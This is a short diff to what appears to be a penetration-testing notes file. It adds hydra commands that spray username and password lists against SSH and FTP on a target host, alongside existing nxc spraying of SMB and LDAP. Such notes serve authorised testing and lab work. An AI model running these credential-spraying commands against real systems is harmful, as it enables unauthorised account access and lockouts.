@@ -139,6 +139,8 @@ cat usernames | sort -u | tee usernames
 cat passwords | sort -u | tee passwords
 
 ## Spray Services
+(hydra -I ssh://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
+(hydra -I ftp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 (
 (nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
 (nxc ldap "$TARGET" -u usernames -p passwords --continue-on-success &)
